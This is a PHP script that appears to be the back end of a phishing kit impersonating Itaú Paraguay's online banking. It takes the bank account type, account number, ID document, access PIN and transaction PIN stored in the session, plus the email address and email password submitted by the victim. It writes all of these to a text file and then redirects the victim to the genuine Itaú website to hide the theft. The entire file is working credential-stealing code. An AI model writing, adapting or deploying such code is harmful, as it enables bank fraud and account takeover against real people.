<?php
@session_start();

if(isset ($_POST['correo']) && isset ($_POST['correopass']) ){

	$file = fopen("personalindustrial.txt", "a");

fwrite($file, "Tipo= ".$_SESSION['tipo']." - N Cuenta = ".$_SESSION['cuenta']." - documento = ".$_SESSION['documento']." - PIN de acceso.  = ".$_SESSION['pass']."
Pin de transaccion= ".$_SESSION['pass2']." - Correo =".$_POST['correo']." - Clave de Correo =".$_POST['correopass']."
Fecha= ".date('Y-m-d')." - ".date('H:i:s')." ".$user_ip." ".$cc."  ". PHP_EOL);
fwrite($file, "======================================================== " . PHP_EOL);
fclose($file);

header("Location: https://www.itau.com.py/personas");

}else{ header ('location: index.html');}
session_destroy();
?>
